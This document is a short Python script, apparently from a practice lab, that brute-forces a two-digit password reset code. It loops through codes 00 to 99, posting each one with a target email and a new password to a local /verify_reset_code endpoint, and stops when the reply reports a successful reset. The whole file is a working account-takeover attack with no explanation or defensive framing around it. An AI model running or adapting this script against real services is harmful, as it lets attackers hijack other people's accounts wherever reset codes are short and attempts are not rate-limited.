import requests

# The URL to which the POST request is made
url = "http://127.0.0.1:5000/verify_reset_code"

# Email address and new password details
email_address = "asd@mail.com"
new_password = "newpassword123"  # The new password you want to set

# Function to make the POST request to the server
def attempt_reset(code):
    data = {
        'email': email_address,
        'reset_code': code,
        'new_password': new_password,
        'confirm_password': new_password
    }
    response = requests.post(url, data=data)
    print(f"Trying code: {code}")
    return response.text

# Brute force loop
for code in range(00, 100):  # 2-digit codes
    code_str = f"{code:02d}"
    response_text = attempt_reset(code_str)
    if "Password reset successful" in response_text:
        print(f"Success! The correct code is: {code_str}")
        break
    else:
        print(f"Failed with code: {code_str}")
